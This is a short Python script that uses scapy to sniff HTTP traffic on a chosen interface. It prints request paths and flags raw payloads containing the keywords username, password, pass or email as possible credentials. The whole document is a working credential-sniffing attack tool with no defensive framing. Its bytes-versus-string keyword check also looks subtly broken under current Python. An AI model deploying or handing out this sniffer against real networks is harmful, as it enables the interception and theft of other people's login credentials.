import scapy.all as scapy
import argparse
from scapy.layers import http

def get_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Specify interface on which to sniff packets ")
    arguments = parser.parse_args()
    return arguments.interface

def sniffer(iface):
    scapy.sniff(iface=iface, store=False, prn=process_packet)

def process_packet(packet):
    
    if packet.haslayer(http.HTTPRequest):
        print("[+] Http Request >> "+ packet[http.HTTPRequest].Path)
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keys = ["username", "password", "pass", "email"]
            for key in keys:
                if key in load:
                    print("[+] Possible password/username >>" +load)
                    break
                
iface = get_interface()
sniffer(iface)

